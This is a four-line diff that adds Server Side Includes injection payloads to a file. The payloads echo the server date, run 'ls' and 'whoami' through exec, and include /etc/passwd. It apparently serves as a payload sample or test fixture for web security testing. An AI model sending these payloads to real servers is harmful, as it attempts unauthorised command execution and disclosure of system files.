@@ -1,0 +1,4 @@
+<!--#echo var="DATE_LOCAL" -->
+<!--#exec cmd="ls" -->
+<!--#exec cmd="whoami" -->
+<!--#include virtual="/etc/passwd" -->
